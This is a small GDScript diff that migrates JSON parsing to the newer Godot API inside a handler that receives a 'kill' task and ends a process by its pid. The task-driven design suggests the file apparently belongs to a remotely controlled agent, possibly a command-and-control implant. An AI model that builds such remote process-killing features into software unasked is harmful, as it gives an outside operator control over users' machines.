@@ -9,7 +9,9 @@ func _ready():
 func _on_tasking_kill(task):
 
 	if task.has("command") and task.get("command") == "kill":
-		var parameters = parse_json(task.get("parameters"))
+		var test_json_conv = JSON.new()
+		test_json_conv.parse(task.get("parameters"))
+		var parameters = test_json_conv.get_data()
 		var status = OS.kill(parameters.get("pid"))
 		var output = "Kill returned: %d" % status
 
